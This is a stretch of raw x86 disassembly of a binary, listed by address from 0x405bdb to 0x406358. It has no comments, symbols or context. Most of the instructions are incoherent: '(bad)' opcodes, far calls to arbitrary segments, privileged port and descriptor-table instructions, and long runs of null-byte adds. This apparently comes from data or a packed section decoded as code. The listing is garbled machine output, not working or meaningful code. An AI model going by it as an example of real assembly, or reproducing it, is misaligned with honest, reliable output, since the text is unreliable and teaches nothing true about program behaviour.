  405bdb:	add    dl,BYTE PTR [ebp+0x3]
  405bde:	rol    DWORD PTR [edx],0x0
  405be1:	add    BYTE PTR [eax],al
  405be3:	add    BYTE PTR [eax],al
  405be5:	popa   
  405be6:	add    edi,DWORD PTR [edx+eax*1+0x2b70389]
  405bed:	push   ecx
  405bee:	add    eax,DWORD PTR [edx+eax*1+0x28f037e]
  405bf5:	ins    BYTE PTR es:[edi],dx
  405bf6:	add    esi,DWORD PTR [edx+eax*1-0x6c]
  405bfa:	add    eax,DWORD PTR [eax]
  405bfc:	jno    0x405c75
  405bfe:	(bad)  
  405c00:	ins    BYTE PTR es:[edi],dx
  405c01:	ja     0x405be2
  405c03:	add    BYTE PTR [edi+0x77],ah
  405c06:	iret   
  405c07:	add    BYTE PTR [ebx-0x75fed58a],cl
  405c0d:	jbe    0x405be3
  405c0f:	add    BYTE PTR [esi+esi*2+0x768f011a],al
  405c16:	sub    DWORD PTR [ecx],eax
  405c18:	xchg   ebx,eax
  405c19:	jbe    0x405c2b
  405c1b:	add    DWORD PTR [edx+0x7d012076],eax
  405c21:	jbe    0x405c07
  405c23:	add    BYTE PTR [edx+0x76],bl
  405c26:	aad    0x0
  405c28:	push   esp
  405c29:	jbe    0x405c46
  405c2b:	add    DWORD PTR [edi+0x76],ebx
  405c2e:	add    DWORD PTR cs:[ebx+0x76],edx
  405c32:	sgdtd  [edx+0x76]
  405c36:	pop    ds
  405c37:	add    DWORD PTR ds:0x3400e376,edi
  405c3d:	jbe    0x405bf7
  405c3f:	add    BYTE PTR [esi],ch
  405c41:	jbe    0x405bfa
  405c43:	add    BYTE PTR [ecx-0x59fefd89],ch
  405c49:	add    BYTE PTR [eax],al
  405c4b:	add    BYTE PTR [eax],al
  405c4d:	add    BYTE PTR [edi+0x1c],dh
  405c50:	add    DWORD PTR [ebp-0x61feeb89],esp
  405c56:	ja     0x405c70
  405c58:	add    DWORD PTR [eax-0x64ff3a89],ebx
  405c5e:	ja     0x405c1e
  405c60:	add    BYTE PTR [edx-0x6ffecb89],bl
  405c66:	ja     0x405c58
  405c68:	add    ah,al
  405c6a:	ja     0x405c46
  405c6c:	add    BYTE PTR [edi-0x76ff2789],bh
  405c72:	ja     0x405c75
  405c74:	add    DWORD PTR [esi+0x11b77],eax
  405c7a:	or     BYTE PTR [ecx],al
  405c7c:	pop    ss
  405c7d:	add    ebx,ebp
  405c7f:	add    BYTE PTR [ebx],ch
  405c81:	add    DWORD PTR [ebp+0x0],ecx
  405c84:	inc    esi
  405c85:	add    DWORD PTR [esi+0x0],ecx
  405c88:	dec    ebp
  405c89:	add    DWORD PTR [edi],ebx
  405c8b:	add    BYTE PTR [edi],dh
  405c8d:	add    DWORD PTR [ebp+0x0],edx
  405c90:	jae    0x405c93
  405c92:	dec    ecx
  405c93:	add    BYTE PTR [ecx+0x1],ch
  405c96:	cmp    al,BYTE PTR [eax]
  405c98:	imul   eax,DWORD PTR [ecx],0xffffffba
  405c9b:	add    edi,DWORD PTR [esi]
  405c9d:	and    ch,ch
  405c9f:	add    eax,DWORD PTR [edx]
  405ca1:	xor    dh,bh
  405ca3:	add    ecx,DWORD PTR [eax+esi*1]
  405ca6:	inc    DWORD PTR [ebx]
  405ca8:	or     eax,0x1033030
  405cad:	xor    BYTE PTR [ecx],dh
  405caf:	add    edi,ebx
  405cb1:	xor    BYTE PTR [eax],al
  405cb3:	add    BYTE PTR [eax],al
  405cb5:	add    BYTE PTR [eax],al
  405cb7:	ret    0xf203
  405cba:	xor    BYTE PTR [ebx-0x3bcf5efd],dh
  405cc0:	add    esp,DWORD PTR [ebx-0x5afc3ad0]
  405cc6:	xor    BYTE PTR [esi-0x48cf58fd],dh
  405ccc:	add    ebp,DWORD PTR [ecx-0x1d0617d0]
  405cd2:	xor    cl,ch
  405cd4:	stc    
  405cd5:	in     al,0x30
  405cd7:	cli    
  405cd8:	stc    
  405cd9:	out    0x30,al
  405cdb:	stos   DWORD PTR es:[edi],eax
  405cdc:	cli    
  405cdd:	ret    0x9c30
  405ce0:	cli    
  405ce1:	sti    
  405ce2:	xor    BYTE PTR [ebp-0x71cf5e06],bl
  405ce8:	cli    
  405ce9:	mov    ds:0xa5fa8f30,eax
  405cee:	xor    BYTE PTR [eax-0x5ecf5806],ah
  405cf4:	cli    
  405cf5:	test   eax,0x7cb7530
  405cfa:	stos   DWORD PTR es:[edi],eax
  405cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cfc:	aam    0x7
  405cfe:	lods   eax,DWORD PTR ds:[esi]
  405cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d00:	rol    DWORD PTR [edi],0xaf
  405d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d04:	ret    0xb107
  405d07:	test   DWORD PTR [edi],ebp
  405d09:	or     BYTE PTR [ebx-0x4af7cf7b],dh
  405d0f:	test   DWORD PTR [ebp-0x717a48f8],esp
  405d15:	or     BYTE PTR [ecx-0x44f76c9b],bh
  405d1b:	add    BYTE PTR [eax],al
  405d1d:	add    BYTE PTR [eax],al
  405d1f:	add    BYTE PTR [ebp+0x7c],ah
  405d22:	or     BYTE PTR [ebp-0x40f7e69b],bh
  405d28:	sbb    cl,BYTE PTR gs:[eax]
  405d2b:	rol    DWORD PTR [ebp+0x17],0x8
  405d2f:	les    eax,FWORD PTR [ebp+0x18]
  405d32:	or     dh,al
  405d34:	inc    ebp
  405d35:	sbb    eax,0x2645c808
  405d3a:	or     dl,cl
  405d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d3d:	sbb    DWORD PTR [eax],ecx
  405d3f:	retf   
  405d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d41:	and    BYTE PTR [eax],cl
  405d43:	int3   
  405d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d45:	xor    ecx,DWORD PTR [eax]
  405d47:	int    0xa5
  405d49:	xor    cl,BYTE PTR [eax]
  405d4b:	into   
  405d4c:	test   DWORD PTR ds:0x2485cf08,esp
  405d52:	or     dl,dl
  405d54:	test   DWORD PTR [edi-0x697a2af9],ebp
  405d5a:	pop    es
  405d5b:	fsub   DWORD PTR [ebp-0x5f]
  405d5e:	pop    es
  405d5f:	(bad)  [ebp-0x78]
  405d62:	pop    es
  405d63:	fisub  WORD PTR [ebp-0x75]
  405d66:	pop    es
  405d67:	fbld   TBYTE PTR [ebp-0x76]
  405d6a:	pop    es
  405d6b:	loopne 0x405db2
  405d6d:	lea    eax,[edi]
  405d6f:	loope  0x405db6
  405d71:	mov    WORD PTR [edi],es
  405d73:	loop   0x405dba
  405d75:	add    bh,BYTE PTR [ebp-0x4bcceef9]
  405d7b:	pop    es
  405d7c:	(bad)  [edx]
  405d7e:	mov    edi,0xb632dd07
  405d83:	pop    es
  405d84:	add    BYTE PTR [eax],al
  405d86:	add    BYTE PTR [eax],al
  405d88:	add    ah,cl
  405d8a:	xor    ah,BYTE PTR [ecx-0x5fcd30f9]
  405d90:	pop    es
  405d91:	fidiv  WORD PTR [edx]
  405d93:	xchg   ebx,eax
  405d94:	pop    es
  405d95:	fnstenv [edx]
  405d97:	xchg   edx,eax
  405d98:	pop    es
  405d99:	shl    BYTE PTR [edx],1
  405d9b:	inc    ebp
  405d9c:	pop    es
  405d9d:	retf   0x3c32
  405da0:	pop    es
  405da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405da2:	xor    dh,BYTE PTR [edi]
  405da4:	pop    es
  405da5:	push   cs
  405da6:	xor    ebp,DWORD PTR [esi]
  405da8:	pop    es
  405da9:	add    DWORD PTR [ebx],esi
  405dab:	xchg   ebp,eax
  405dac:	push   es
  405dad:	imul   eax,DWORD PTR [eax],0x6e0682
  405db3:	jbe    0x405dbb
  405db5:	push   0x0
  405db7:	sub    BYTE PTR [esi],al
  405db9:	push   esp
  405dba:	add    BYTE PTR [ebx],ch
  405dbc:	push   es
  405dbd:	push   edi
  405dbe:	add    BYTE PTR [edx],ch
  405dc0:	push   es
  405dc1:	xchg   esi,eax
  405dc2:	add    BYTE PTR ds:0x24009106,ch
  405dc8:	push   es
  405dc9:	cwde   
  405dca:	add    BYTE PTR [edi],ch
  405dcc:	push   es
  405dcd:	xchg   ebx,eax
  405dce:	add    BYTE PTR [esi],ah
  405dd0:	push   es
  405dd1:	call   0x2000:0x9d062100
  405dd8:	push   es
  405dd9:	mov    WORD PTR [eax],es
  405ddb:	mov    bl,0x1
  405ddd:	pop    DWORD PTR [eax]
  405ddf:	mov    dl,0x1
  405de1:	pop    esi
  405de2:	add    BYTE PTR [ebp-0x63ffa6ff],ah
  405de8:	add    DWORD PTR [eax+0x0],edx
  405deb:	mov    bh,0x1
  405ded:	add    BYTE PTR [eax],al
  405def:	add    BYTE PTR [eax],al
  405df1:	add    BYTE PTR [ebx+0x0],cl
  405df4:	scas   al,BYTE PTR es:[edi]
  405df5:	add    DWORD PTR [edx+0x0],esp
  405df8:	add    BYTE PTR [ecx-0x67f9cd8c],bl
  405dfe:	je     0x405e33
  405e00:	push   es
  405e01:	mov    ebx,0xba063474
  405e06:	je     0x405e3d
  405e08:	push   es
  405e09:	mov    ebp,0xb4062e74
  405e0e:	je     0x405e3f
  405e10:	push   es
  405e11:	lahf   
  405e12:	je     0x405e44
  405e14:	push   es
  405e15:	xchg   esi,eax
  405e16:	je     0x405e49
  405e18:	push   es
  405e19:	xchg   ecx,eax
  405e1a:	je     0x405e46
  405e1c:	push   es
  405e1d:	nop
  405e1e:	je     0x405e4b
  405e20:	push   es
  405e21:	inc    ebx
  405e22:	je     0x405e50
  405e24:	push   es
  405e25:	dec    ecx
  405e26:	je     0x405dea
  405e28:	add    eax,0x5c37448
  405e2d:	dec    ebx
  405e2e:	je     0x405df4
  405e30:	add    eax,0x5c5744a
  405e35:	inc    ebp
  405e36:	je     0x405df6
  405e38:	add    eax,0x5bf744c
  405e3d:	inc    edi
  405e3e:	je     0x405e00
  405e40:	add    eax,0x5c1740e
  405e45:	adc    DWORD PTR [edx+edi*4+0x5],esi
  405e49:	add    BYTE PTR [ecx+edi*4+0x5],dh
  405e4d:	add    esi,DWORD PTR [esp+edi*4+0x5]
  405e51:	adc    dh,BYTE PTR [ebx+edi*4+0x5]
  405e55:	or     eax,0x0
  405e5a:	add    BYTE PTR [esi+esi*4+0x5],dh
  405e5e:	add    al,0x74
  405e60:	mov    ch,0x5
  405e62:	push   DWORD PTR [ebp-0x48]
  405e65:	add    eax,0x5b775d6
  405e6a:	fnstenv [ebp-0x2e]
  405e6d:	add    eax,0x5d175d8
  405e72:	(bad)  [ebp-0x2c]
  405e75:	add    eax,0x5201ed00
  405e7a:	add    al,0xfe
  405e7c:	add    DWORD PTR [ebx+0x4],edx
  405e7f:	inc    DWORD PTR [ecx]
  405e81:	push   ecx
  405e82:	add    al,0xf8
  405e84:	add    DWORD PTR [esp+eax*1-0x57],edx
  405e88:	add    DWORD PTR [ebp+0x4],edx
  405e8b:	cmp    al,BYTE PTR [ecx]
  405e8d:	push   esi
  405e8e:	add    al,0x3b
  405e90:	add    DWORD PTR [edi+0x4],edx
  405e93:	xor    al,0x1
  405e95:	pop    eax
  405e96:	add    al,0x45
  405e98:	add    DWORD PTR [ecx+0x4],ebx
  405e9b:	add    DWORD PTR es:[edx+0x4],ebx
  405e9f:	aaa    
  405ea0:	add    DWORD PTR [ebx+0x4],ebx
  405ea3:	add    BYTE PTR [ecx],0x5c
  405ea6:	add    al,0xe1
  405ea8:	add    DWORD PTR [ecx+0x5e020204],edx
  405eae:	add    al,0xf3
  405eb0:	add    DWORD PTR [edi+0x4],ebx
  405eb3:	cld    
  405eb4:	add    DWORD PTR [esi],edx
  405eb6:	and    DWORD PTR ds:0xe040201,ebx
  405ebc:	add    DWORD PTR [ebx],eax
  405ebe:	add    al,0x0
  405ec0:	add    BYTE PTR [eax],al
  405ec2:	add    BYTE PTR [eax],al
  405ec4:	sgdtd  [ecx]
  405ec7:	add    al,0x8
  405ec9:	add    DWORD PTR [esp+eax*1],eax
  405ecc:	sbb    DWORD PTR [ecx],eax
  405ece:	add    eax,0x601ca04
  405ed3:	add    al,0xcb
  405ed5:	add    DWORD PTR [edi],eax
  405ed7:	add    al,0xc4
  405ed9:	add    DWORD PTR [eax],ecx
  405edb:	add    al,0xb5
  405edd:	add    DWORD PTR [ecx],ecx
  405edf:	add    al,0xb6
  405ee1:	add    DWORD PTR [edx],ecx
  405ee3:	add    al,0x87
  405ee5:	add    DWORD PTR [ebx],ecx
  405ee7:	add    al,0x90
  405ee9:	add    DWORD PTR [esp+eax*1],ecx
  405eec:	adc    DWORD PTR [eax+edx*4],eax
  405eef:	add    al,0x12
  405ef1:	add    al,0xe
  405ef3:	add    al,0x75
  405ef5:	nop
  405ef6:	add    cl,BYTE PTR [edi]
  405ef8:	jns    0x405e93
  405efa:	add    cl,BYTE PTR [esi+0x71]
  405efd:	call   0x3102:0x9b793002
  405f04:	jno    0x405ea2
  405f06:	add    al,BYTE PTR [esi+0x79]
  405f09:	popf   
  405f0a:	add    dh,BYTE PTR [ecx+esi*2]
  405f0d:	xchg   esi,eax
  405f0e:	add    dh,BYTE PTR ds:0x44029f79
  405f14:	jno    0x405eae
  405f16:	add    dh,BYTE PTR [ebx]
  405f18:	jns    0x405ebb
  405f1a:	add    al,BYTE PTR [ebp+0x71]
  405f1d:	mov    dl,0x2
  405f1f:	cmp    BYTE PTR [ecx-0x4d],bh
  405f22:	add    bh,BYTE PTR [ecx]
  405f24:	jno    0x405eca
  405f26:	add    bh,BYTE PTR [edx]
  405f28:	add    BYTE PTR [eax],al
  405f2a:	add    BYTE PTR [eax],al
  405f2c:	add    BYTE PTR [ecx-0x7b],bh
  405f2f:	add    bh,BYTE PTR [ebx]
  405f31:	jno    0x405f61
  405f33:	add    bh,BYTE PTR [ecx+edi*2]
  405f36:	pop    ss
  405f37:	add    bh,BYTE PTR ds:0x3e022071
  405f3d:	jns    0x405f68
  405f3f:	add    bh,BYTE PTR [edi]
  405f41:	jno    0x405f4d
  405f43:	add    cl,BYTE PTR [edi+0x79]
  405f46:	or     eax,DWORD PTR [edx]
  405f48:	inc    eax
  405f49:	jno    0x405f57
  405f4b:	add    al,BYTE PTR [ecx+0x79]
  405f4e:	or     eax,0x26714202
  405f53:	add    al,BYTE PTR [ebx+0x79]
  405f56:	sub    eax,0x24713602
  405f5b:	add    dh,BYTE PTR [edx]
  405f5d:	jns    0x405f92
  405f5f:	add    cl,BYTE PTR [ecx+esi*2+0x22]
  405f63:	add    cl,BYTE PTR [ebx+0x79]
  405f66:	and    DWORD PTR [edx],eax
  405f68:	aaa    
  405f69:	jno    0x405f7b
  405f6b:	add    cl,BYTE PTR [eax+0x79]
  405f6e:	test   DWORD PTR [ecx],0xc402714d
  405f74:	add    DWORD PTR [esi+edi*8-0x14dfe42],edi
  405f7b:	mov    ch,0x1
  405f7d:	scas   eax,DWORD PTR es:[edi]
  405f7e:	dec    al
  405f80:	add    DWORD PTR [ebx-0x2],ecx
  405f83:	mov    DWORD PTR [ecx],0x1cafe65
  405f89:	fs dec cl
  405f8c:	add    DWORD PTR [ebx-0x2],ebx
  405f8f:	les    eax,FWORD PTR [ecx]
  405f91:	add    BYTE PTR [eax],al
  405f93:	add    BYTE PTR [eax],al
  405f95:	add    BYTE PTR [ecx-0x2],ah
  405f98:	mov    eax,DWORD PTR [ecx]
  405f9a:	mov    dh,bh
  405f9c:	xchg   BYTE PTR [ecx],al
  405f9e:	xchg   ecx,eax
  405f9f:	dec    BYTE PTR [ebp-0x7f0179ff]
  405fa5:	add    DWORD PTR [eax+0x6d018ffe],edx
  405fab:	(bad)  
  405fac:	xchg   edx,eax
  405fad:	add    DWORD PTR [esi+edi*8-0x7f],ebp
  405fb1:	add    DWORD PTR [edi-0x2],ebx
  405fb4:	jl     0x405fb7
  405fb6:	pop    esi
  405fb7:	(bad)  
  405fb8:	push   ebx
  405fb9:	add    DWORD PTR [ecx-0x77feb102],edx
  405fbf:	inc    BYTE PTR [ebp+0x1]
  405fc2:	cmp    esi,0x58
  405fc5:	add    DWORD PTR [edx-0x2],edi
  405fc8:	aaa    
  405fc9:	add    DWORD PTR [edx-0x2],esp
  405fcc:	cmp    al,BYTE PTR [ecx]
  405fce:	push   ebp
  405fcf:	(bad)  
  405fd0:	cmp    DWORD PTR [ecx],eax
  405fd2:	push   esp
  405fd3:	(bad)  
  405fd4:	xor    al,0x1
  405fd6:	push   edi
  405fd7:	(bad)  
  405fd8:	sbb    eax,DWORD PTR [ecx]
  405fda:	xchg   esi,eax
  405fdb:	(bad)  
  405fdc:	push   ss
  405fdd:	add    DWORD PTR [ebx-0x78fee202],eax
  405fe3:	(bad)  
  405fe4:	adc    BYTE PTR [ecx],al
  405fe6:	mov    esi,edi
  405fe8:	inc    DWORD PTR [eax]
  405fea:	sahf   
  405feb:	inc    BYTE PTR [edx]
  405fed:	add    DWORD PTR [edx-0x2],esp
  405ff0:	push   ecx
  405ff2:	jne    0x40600e
  405ff4:	add    al,0xed
  405ff6:	jne    0x40600f
  405ff8:	add    al,0xe4
  405ffa:	add    BYTE PTR [eax],al
  405ffc:	add    BYTE PTR [eax],al
  405ffe:	add    BYTE PTR [ebx],dh
  406000:	sbb    al,BYTE PTR [edi+ebx*8]
  406003:	sub    ebx,DWORD PTR [esp+eax*1]
  406006:	(bad)  
  406007:	and    ebx,DWORD PTR [ebx]
  406009:	add    al,0x88
  40600b:	sbb    bh,BYTE PTR [edi+0x3]
  40600e:	mov    edx,DWORD PTR [edx]
  406010:	jge    0x406015
  406012:	mov    cl,BYTE PTR [edx]
  406014:	jp     0x406019
  406016:	lea    eax,[edx]
  406018:	jnp    0x40601d
  40601a:	test   dl,bh
  40601c:	call   0x5103:0x78f24e03
  406023:	jmp    0x397:0xe2400376
  40602a:	inc    edx
  40602b:	fidiv  DWORD PTR [ebx+0x3]
  40602e:	push   edi
  40602f:	sar    BYTE PTR [ebp+0x3],cl
  406032:	dec    esi
  406033:	retf   0x200d
  406036:	cmp    dl,al
  406038:	cwde   
  406039:	add    edi,DWORD PTR [ebx]
  40603b:	mov    edx,0xb29a0395
  406040:	xchg   esi,eax
  406041:	add    edx,DWORD PTR [ebp-0x63fc6c56]
  406047:	mov    ds:0x9a97033a,al
  40604c:	je     0x406051
  40604e:	jle    0x405fe2
  406050:	cmp    BYTE PTR [ebx],al
  406052:	or     DWORD PTR [edx-0x7d8ffccb],0x7a730337
  40605c:	xchg   esp,eax
  40605d:	add    esp,DWORD PTR [edx+0x72]
  406060:	add    ebp,DWORD PTR ss:[eax]
  406063:	add    BYTE PTR [eax],al
  406065:	add    BYTE PTR [eax],al
  406067:	add    BYTE PTR [edx-0x6d],ch
  40606a:	add    ebp,DWORD PTR [ebx]
  40606c:	bound  edx,QWORD PTR [edx-0x6ea5d5fd]
  406072:	add    eax,DWORD PTR [eax]
  406074:	mov    al,ds:0x91039363
  406079:	arpl   WORD PTR [ebx+eax*1+0x3956392],dx
  406080:	xchg   ebx,eax
  406081:	arpl   WORD PTR [esi-0x689b1bfd],dx
  406087:	add    esp,ebp
  406089:	fs cwde 
  40608b:	add    edx,esi
  40608d:	fs cdq 
  40608f:	add    edx,edi
  406091:	fs call 0xd903:0x9b64c803
  406099:	fs pushf 
  40609b:	add    ebx,edx
  40609d:	fs popf 
  40609f:	add    ebx,ebx
  4060a1:	fs sahf 
  4060a3:	add    ebp,DWORD PTR [eiz*2+0x652d039f]
  4060aa:	mov    al,ds:0xa2651e03
  4060af:	add    esp,DWORD PTR [eax]
  4060b1:	mov    gs:0xa464f103,eax
  4060b7:	add    esp,edx
  4060b9:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4060bb:	add    esp,ebx
  4060bd:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4060bf:	add    esp,esp
  4060c1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4060c3:	add    esi,DWORD PTR ds:0x3d03a864
  4060c9:	fs mov al,0x3
  4060cc:	add    BYTE PTR [eax],al
  4060ce:	add    BYTE PTR [eax],al
  4060d0:	add    BYTE PTR [esi],ch
  4060d2:	fs mov cl,0x3
  4060d5:	das    
  4060d6:	fs mov dl,0x3
  4060d9:	inc    eax
  4060da:	fs mov bl,0x3
  4060dd:	xor    DWORD PTR [esp+esi*4+0x3],esp
  4060e1:	xor    ah,BYTE PTR [ebp+esi*4+0x3]
  4060e5:	xor    esp,DWORD PTR [esi+esi*4+0x3]
  4060e9:	test   BYTE PTR [edi+esi*4+0x3],ah
  4060ed:	test   DWORD PTR [eax+edi*4+0x3],esp
  4060f1:	jne    0x4060f2
  4060f3:	std    
  4060f4:	mov    ecx,0xbafe0076
  4060f9:	jbe    0x406108
  4060fb:	(bad)  
  4060fc:	mov    ebx,0xbcfdf676
  406101:	jbe    0x4060fe
  406103:	std    
  406104:	mov    ebp,0xbefd6476
  406109:	jbe    0x406154
  40610b:	std    
  40610c:	mov    edi,0xc0fd4a76
  406111:	jbe    0x40615a
  406113:	std    
  406114:	ret    0x4876
  406117:	std    
  406118:	shl    DWORD PTR [esi-0x5b],0xfd
  40611c:	ret    
  40611d:	jbe    0x4060cd
  40611f:	std    
  406120:	les    esi,FWORD PTR [esi-0x5d]
  406123:	std    
  406124:	lds    esi,FWORD PTR [esi-0x54]
  406127:	std    
  406128:	(bad)  
  406129:	jbe    0x4060cc
  40612b:	std    
  40612c:	(bad)  
  40612d:	jbe    0x4060d1
  40612f:	std    
  406130:	enter  0xba76,0xfb
  406134:	mov    dh,0x0
  406136:	add    BYTE PTR [eax],al
  406138:	add    BYTE PTR [eax],al
  40613a:	xchg   esi,eax
  40613b:	mov    bh,0xfb
  40613d:	or     ebx,DWORD PTR [eax-0x6e000448]
  406143:	mov    ebp,0xb6961ffb
  406148:	sti    
  406149:	and    BYTE PTR [esi+0x5801fbbb],dl
  40614f:	je     0x40614d
  406151:	mov    al,ds:0xa2fc9156
  406156:	push   esi
  406157:	cmp    ah,0xa3
  40615a:	push   esi
  40615b:	jg     0x406159
  40615d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40615e:	push   esi
  40615f:	nop
  406160:	cld    
  406161:	call   0x7e56:0x9cfc7556
  406168:	cld    
  406169:	popf   
  40616a:	push   esi
  40616b:	jecxz  0x406168
  40616d:	lahf   
  40616e:	xchg   esi,eax
  40616f:	add    dl,BYTE PTR [esi-0x4]
  406172:	adc    ah,BYTE PTR [esi]
  406174:	pop    ecx
  406175:	cld    
  406176:	push   cs
  406177:	es push ebp
  406179:	cld    
  40617a:	(bad)  
  40617b:	and    al,0x4c
  40617d:	cld    
  40617e:	mov    dl,0x24
  406180:	inc    edi
  406181:	cld    
  406182:	shl    DWORD PTR [esi+edi*1],1
  406185:	cld    
  406186:	(bad)  
  406187:	and    al,0x29
  406189:	cld    
  40618a:	xchg   BYTE PTR [eax+ebp*1],ah
  40618d:	cld    
  40618e:	xchg   ecx,eax
  40618f:	and    al,0xab
  406191:	sti    
  406192:	mov    BYTE PTR [esp+eiz*4],ah
  406195:	sti    
  406196:	jnp    0x4061bc
  406198:	mov    eax,ds:0xa0245efb
  40619d:	sti    
  40619e:	add    BYTE PTR [eax],al
  4061a0:	add    BYTE PTR [eax],al
  4061a2:	add    BYTE PTR [edi+0x26fbb424],dh
  4061a8:	and    al,0xaf
  4061aa:	sti    
  4061ab:	and    al,0x24
  4061ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061ae:	sti    
  4061af:	xchg   ebp,eax
  4061b0:	and    al,0x97
  4061b2:	sti    
  4061b3:	mov    WORD PTR [ebx+eax*8],fs
  4061b6:	sti    
  4061b7:	hlt    
  4061b8:	and    al,0xc2
  4061ba:	sti    
  4061bb:	mul    DWORD PTR [esi*4-0x53db7205]
  4061c2:	sti    
  4061c3:	pushf  
  4061c4:	and    al,0xa7
  4061c6:	sti    
  4061c7:	xchg   ebx,eax
  4061c8:	and    al,0x9e
  4061ca:	sti    
  4061cb:	call   0x7724:0x74fb8624
  4061d2:	sti    
  4061d3:	add    al,0x4
  4061d5:	(bad)  
  4061d6:	sti    
  4061d7:	cli    
  4061d8:	and    ebx,DWORD PTR [ebp-0x5]
  4061db:	add    eax,0x4fb5424
  4061e0:	and    al,0x4f
  4061e2:	sti    
  4061e3:	out    0x23,eax
  4061e5:	es cli 
  4061e7:	push   esp
  4061e8:	es dec ecx
  4061ea:	cli    
  4061eb:	mov    eax,0x7f480027
  4061f0:	jae    0x406217
  4061f2:	dec    ebx
  4061f3:	outs   dx,DWORD PTR ds:[esi]
  4061f4:	or     ah,BYTE PTR [edx+ecx*1]
  4061f7:	outs   dx,DWORD PTR ds:[esi]
  4061f8:	or     eax,0xe5f0524
  4061fd:	and    al,0xc
  4061ff:	pop    edi
  406200:	or     esp,DWORD PTR [ecx+eax*1]
  406203:	dec    edi
  406204:	and    eax,0x1024
  406209:	add    BYTE PTR [eax],al
  40620b:	add    BYTE PTR [edi+0xc],cl
  40620e:	and    al,0x13
  406210:	aas    
  406211:	stc    
  406212:	and    al,0x2
  406214:	aas    
  406215:	adc    DWORD PTR ds:0x250d2cfd,esp
  40621b:	aam    0x78
  40621d:	mul    BYTE PTR [edi+ecx*8]
  406220:	jo     0x406240
  406222:	and    eax,0x239c68c6
  406227:	fld    DWORD PTR [eax+0x78b8239d]
  40622d:	add    ah,BYTE PTR ds:0x239e70bb
  406233:	mov    edx,0xb5239f68
  406238:	cmp    dh,0x24
  40623b:	pushf  
  40623c:	js     0x406264
  40623e:	and    eax,0x25167097
  406243:	sahf   
  406244:	push   0x8091252e
  406249:	add    al,0x25
  40624b:	dec    eax
  40624c:	jnp    0x406253
  40624e:	and    BYTE PTR [ebx+0x73],cl
  406251:	add    al,0x20
  406253:	dec    edx
  406254:	imul   eax,DWORD PTR [esi],0x20
  406257:	inc    ebp
  406258:	add    DWORD PTR [edi],0x20
  40625b:	mov    WORD PTR [ebx+0x9],?
  40625e:	and    BYTE PTR [edi-0x71dff58d],al
  406264:	imul   ecx,DWORD PTR [ebx],0x20
  406267:	add    DWORD PTR [ebx-0x1affdff4],0x20140f
  406271:	add    BYTE PTR [eax],al
  406273:	add    BYTE PTR [eax],al
  406275:	out    0xf,al
  406277:	adc    esp,DWORD PTR [eax]
  406279:	lock mov db4,esp
  40627d:	repnz adc BYTE PTR [esi],ah
  406280:	and    bl,al
  406282:	adc    BYTE PTR ds:0x5310bc20,ah
  406288:	and    DWORD PTR [ebp-0x51deabf0],edi
  40628e:	adc    BYTE PTR [ebp+0x21],dl
  406291:	(bad)  
  406292:	adc    BYTE PTR [esi+0x21],dl
  406295:	mov    BYTE PTR [eax],dl
  406297:	push   edi
  406298:	and    DWORD PTR [ecx+0x10],edi
  40629b:	pop    eax
  40629c:	and    DWORD PTR [edx+0x10],ebp
  40629f:	pop    ecx
  4062a0:	and    DWORD PTR [ebx],ecx
  4062a2:	push   cs
  4062a3:	pop    edx
  4062a4:	and    esp,edx
  4062a6:	or     eax,0xe072105
  4062ab:	adc    ah,BYTE PTR [eax]
  4062ad:	add    BYTE PTR [esi],cl
  4062af:	sub    DWORD PTR [ebx],esp
  4062b1:	icebp  
  4062b2:	or     eax,0xd82002e
  4062b7:	sub    ah,BYTE PTR [ebx]
  4062b9:	iret   
  4062ba:	or     eax,0xe18215b
  4062bf:	pop    esp
  4062c0:	and    DWORD PTR [ecx],ebx
  4062c2:	push   cs
  4062c3:	pop    ebp
  4062c4:	and    DWORD PTR [edx],ebx
  4062c6:	push   cs
  4062c7:	pop    esi
  4062c8:	and    DWORD PTR ds:0x1621220e,edx
  4062ce:	push   cs
  4062cf:	adc    esp,DWORD PTR [esi]
  4062d1:	add    BYTE PTR [esi],cl
  4062d3:	shl    DWORD PTR ds:0x25b70e11,0x0
  4062da:	add    BYTE PTR [eax],al
  4062dc:	add    BYTE PTR [eax],al
  4062de:	adc    cl,BYTE PTR [esi]
  4062e0:	retf   
  4062e1:	and    eax,0x25af0e13
  4062e6:	ins    BYTE PTR es:[edi],dx
  4062e7:	or     eax,0xd5d2018
  4062ec:	sbb    DWORD PTR [eax],esp
  4062ee:	jne    0x40630b
  4062f0:	or     eax,0xd1c551c
  4062f5:	sbb    eax,0x1e0cfd55
  4062fa:	push   esp
  4062fb:	test   DWORD PTR [edx+esi*1],0x330d0055
  406302:	xchg   ebp,eax
  406303:	repnz or al,0x1d
  406306:	xchg   edx,eax
  406307:	les    ecx,FWORD PTR [esp+ebp*4]
  40630a:	cwde   
  40630b:	sbb    eax,0x1690c00d
  406310:	or     eax,0xd2f98b6
  406315:	iret   
  406316:	nop
  406317:	sub    BYTE PTR ds:0xd0998ae,cl
  40631d:	out    0x90,al
  40631f:	or     cl,BYTE PTR ds:0xd0b58ab
  406325:	lods   eax,DWORD PTR ds:[esi]
  406326:	push   eax
  406327:	dec    esp
  406328:	push   cs
  406329:	mov    bl,0x58
  40632b:	inc    ebp
  40632c:	push   cs
  40632d:	mov    ebp,0x60e4e50
  406332:	pop    ebx
  406333:	inc    edi
  406334:	push   cs
  406335:	and    dl,BYTE PTR [ebp+0x50]
  406338:	push   cs
  406339:	stos   BYTE PTR es:[edi],al
  40633a:	pop    eax
  40633b:	xor    DWORD PTR [esi],ecx
  40633d:	mov    dl,0x50
  40633f:	inc    edx
  406340:	push   cs
  406341:	mov    esp,0x0
  406346:	add    BYTE PTR [eax-0x6ce3f1bd],bl
  40634c:	je     0x40635c
  40634e:	push   ds
  40634f:	fwait
  406350:	lea    ecx,[esi]
  406352:	arpl   WORD PTR [ebx-0x6499f17a],dx
  406358:	fisttp WORD PTR ds:0xdd99365
